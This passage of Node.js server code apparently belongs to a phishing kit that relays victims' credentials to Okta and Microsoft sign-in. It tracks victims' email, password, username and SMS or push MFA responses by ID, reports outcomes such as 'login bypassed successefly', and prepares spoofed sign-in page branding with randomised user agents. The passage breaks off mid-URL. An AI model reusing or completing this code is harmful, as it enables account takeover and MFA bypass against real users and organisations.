}else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']=="PushNoResponse" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('Push No Response');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"];
  }
  
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"CodeNotFound","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"CodeNotFound","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           

  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Pending"){
   console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return; 
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Queuing"){
console.log('Retry');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;             
  }else{
      console.log('Request Failed..');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "MFA","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
  res.write(JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "MFA","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
       
  }else if(typeof req.query.user !== 'undefined' && typeof req.query.type !== 'undefined' && decodeURI(req.query.type)=="username"){
   //"user":{"type":false,"username":false,"result":"CorrectUser","retry":false,"time":false,"exrobot3@exrobotos.net":"ok"}  
   console.log('validate user query: ',req.query);  
  console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)] !== 'undefined' && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]!== 'undefined' && ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]==[decodeURI(req.query.user)] && typeof  ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined' && ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Pending"){
   console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
   console.log('Validate Url Response::',JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return; 
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]==false&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']=='FoundUser'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Pending"){
   console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
   console.log('Validate Url Response::',JSON.stringify({ "StatusCode":3,"Status": "pending","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":3,"Status": "pending","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;         
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.user)]!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.user)]=="ok"&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']=="CorrectUser"/*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
      //&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]==decodeURI(req.query.user)
      
  console.log('username submited successefly');
  console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
 var Auth = false; 
 if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['next']['auth']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['next']['auth']!== false){
   Auth= ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['next']['auth'];
 } 
  
  
  
  
  console.log('Validate Url Response::',JSON.stringify({ "StatusCode":0,"Status": "success","Type": "username","Msg":"username submited successefly","Auth":Auth,"Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":0,"Status": "success","Type": "username","Msg":"username submited successefly","Auth":Auth,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
            
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.type)]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][req.query.user]!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user'][decodeURI(req.query.user)]=="no"&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']=="WrongUser" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('Wrong User');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["result"]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["retry"];
  }
  
  console.log('Validate Url Response::',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "username","Retry": isretry,"Msg":"WrongUser","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "username","Retry": isretry,"Msg":"Wrong User","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           
}else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']['result']=="UserNotFound" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('UserNotFound');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["result"]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['user']["retry"];
  }
  
  console.log('Validate Url Response::',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "username","Retry": isretry,"Msg":"UserNotFound","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "username","Retry": isretry,"Msg":"UserNotFound","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           

  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Queuing"){
console.log('Retry');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
   console.log('Validate Url Response::',JSON.stringify({ "StatusCode":4,"Status": "queuing","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":4,"Status": "queuing","Type": "username","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;             
  }else{
      console.log('Request Failed.');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
  console.log('Validate Url Response::',JSON.stringify({ "StatusCode":5,"Status": "failed","Type": "username","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
  res.write(JSON.stringify({ "StatusCode":5,"Status": "failed","Type": "username","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  console.log('step:',step) 
  console.log('step2:',step2) 
 console.log('step3:',step3) 
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
  
  }else if(typeof req.query.user !== 'undefined'&&typeof req.query.code !== 'undefined' && typeof req.query.type !== 'undefined' && decodeURI(req.query.type)=="login"){
console.log('validate login query: ',req.query);
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.user] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.user]=="ok"&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.pass] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.pass]=="ok" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
  console.log('login bypassed successefly');
  console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
  nextauth=false;
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['next'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['next'] !== false){
    nextauth=ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['next'];
  }
console.log('Validate Url Response:',JSON.stringify({ "StatusCode":0,"Status": "success","Type": "LOGIN","Msg":"login bypassed successefly","Next":nextauth,"Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":0,"Status": "success","Type": "LOGIN","Msg":"Login Bypassed Successefly","Next":nextauth,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
            
  }else if(((typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.user] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][decodeURI(req.query.user)]=="no")||(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][req.query.code] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)][decodeURI(req.query.code)]=="no"))&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['result']=="WrongLogin" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('Wrong Login');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["result"] !== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["retry"];
  }
  
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "LOGIN","Retry": isretry,"Msg":"Wrong Login","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "LOGIN","Retry": isretry,"Msg":"Wrong Login","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           
}else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['code']!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]['result']=="CodeNotFound" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('LoginNotFound');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["result"]!=='undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["retry"]!=='undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)][decodeURI(req.query.type)]["retry"];
  }
  
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "LOGIN","Retry": isretry,"Msg":"LoginNotFound","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "LOGIN","Retry": isretry,"Msg":"LoginNotFound","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           

  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Pending"){
   console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "LOGIN","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "LOGIN","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return; 
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Queuing"){
console.log('Retry');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "LOGIN","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "LOGIN","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;             
  }else{
      console.log('Request Failed.');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "LOGIN","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
  res.write(JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "LOGIN","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
        
  }
  
     
 }else if(typeof req.query.getsaml!== 'undefined'&&req.query.email&&req.query.auth!== 'undefined'){
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:'+RndUserAgent);

try {
const axios = require('axios');
//const source = axios.CancelToken.source();
//const cancelToken = source.token;
axios.defaults.withCredentials = true;
var DateNow = new Date().toUTCString();
//const request = require('request')
var result = {};
try{
var eMail=decodeURIComponent(req.query.email.toLowerCase());
}catch(e){
var eMail=req.query.email.toLowerCase();    
}
try{
var passWord=decodeURIComponent(req.query.pass);
}catch(e){
var passWord=req.query.pass;    
}

try{
var samlAuth=decodeURIComponent(Buffer.from(decodeURI(req.query.auth), 'base64').toString('ascii'));
}catch(e){
var samlAuth=false;   
}
//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
var inow=req.query.torestart;
//var reqsetcookie = (req.query.setcookie !== undefined &&( req.query.setcookie === true || req.query.setcookie.toString().trim() === 'true'|| req.query.setcookie.toString().trim() === '1'|| req.query.setcookie.toLowerCase() === 'true'));
//var reqgetcookie = (req.query.getcookie !== undefined &&( req.query.getcookie === true || req.query.getcookie.toString().trim() === 'true'|| req.query.getcookie.toString().trim() === '1'|| req.query.getcookie.toLowerCase() === 'true'));
//var reqcookie = postcookie;//req.query.cookie
//var reqres = (req.query.res !== undefined &&( req.query.res === true || req.query.res.toString().trim() === 'true'|| req.query.res.toString().trim() === '1'|| req.query.res.toLowerCase() === 'true'));
var reqUserIP=req.query.ci;
var reqUserUA=req.query.ca;
var reqServerIP=req.query.si
var reqServerHOST=req.query.ht
var reqMT = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.mt&&req.query.mt.toString().trim().toLowerCase()!=='false'&&req.query.mt!==''){
var strreqmt = decodeURI(req.query.mt);
if(Buffer.from(Buffer.from(strreqmt, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmt){
console.log('mt2: '+Buffer.from(strreqmt, 'base64').toString('utf8'));//'ascii'
reqMT = Buffer.from(strreqmt, 'base64').toString('utf8');//'ascii'
}else{
console.log('mt3: '+strreqmt);
reqMT = strreqmt;
}    
}   

//req.query.md



//var reqtime=new Date(); 
//var starTime = new Date().getTime();
var StartTime = new Date();
var StartTime2 = new Date();//data.reqTime;
var DateNow = new Date().toUTCString();

/*
var FastPass = false;
var BBackgroundUrl = false;
var LogoUrl = false;
var BannerText = false;
var TitleText = false;
var SigninTitle = false;
var UserLabel = false;
var PassLabel = false;
var AuthFooter = false;//no
var FooterForgot = false;
var FooterUnlock = false;
var FooterHelp = false;
var RememberMe = false;
*/

var SupportedLang = ['en', 'fr', 'ru', 'de', 'es', 'it', 'ja', 'zh-CN'];
console.log('SupportedLang :',SupportedLang);
var DisplayLang = false;
var FastPass = false;
var ShowIdentifier = false;
var BBackgroundUrl = false;
var LogoUrl = false;
var BannerText = false;
var TitleText = false;
var SigninTitle = false;
var ShowPassToggle = false;
var UserLabel = false;
var PassLabel = false;
var InputUser = false;
var InputPass = false;
var IncludedEmail = false;
var AuthFooter = false;//no
var ExpandedHelp = false;
var FooterForgot = false;
var FooterUnlock = false;
var FooterHelp = false;
var FooterCustom=false;
var RememberMe = false;
var BSigninForMFA = false;
var BSigninForReset = false;
var pageTitle = false;
/*var headers1 = {
    //'User-Agent': RndUserAgent,
    //'Referer': 'https://login.microsoftonline.com/'
    //'Content-type': 'application/json'
    //'content-type': 'application/x-www-form-urlencoded'
};
*/
/*
fetch("https://okta.okta.com/app/office365/kw0h9qx8AJWYBILCHEZY/sso/wsfed/passive?client-request-id=551233c3-675a-4acd-bb43-7ebbc38e12d9&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZI9iNtmHMYt-865mH5cLqUk2w2FlgbLr1_JknxQqGL5U5YUW5J91mJsWV_Wx-sPWV9D50BpyZQhY8YbO5WmQ-G2g0Lolkyh0KVQKJmyJb50Dl3-_B9-z_b8SkcUXqVwgIOvCxAHZ1-QNFUjydq8TECdKpP1OSgzhEGVq4s6sUeQpvTZ5qR0fEmcqJr1e-9Z47tnlz-evLjATu0wXG3PKpU4jnFkmo5u4DryK94sWDiBFcGfMew5hj3JHxpBWZUv8luKoOs0SdEkrNUJhqoDBheykStyzVRTmqHGqWCSAiAs9bSveK6oTELRn4BJpkNt2U2EJUtI3IScKAKpXTNuTx0AtKWe9BXbExUrFOHQ1xSLlMbDfVaJl_lPJXYX2vD6oI2TGa_zN0208acrtA2fFB7nyYU9BUm_4axVGFNdEjCU3wjJrWkrvK167TStyVWSTxtcNh-bvDTepG2jHI9dh4LCyu8ZhLebJLJr12XI2_z8fuRYCTKq0brDxqN1U4yqqqCmLb2aLVLJ1Vgj8bXhzDPWiSXtRrElVofpaDfrmoPY1r2FG9l9S5pygx4KJDvr1nbsTE39tqs_aJLDemt0riblgSkitjNddbJkLgVhV5ehpp2bHd18kG0azZCo21bC8kthJWctJmq3YKd33m6v41CK-qSWeSTh8lRoRglFj3kEI4ueI4aZZuD-OKAmgnVRuPuBeSP4U6G4f3wUX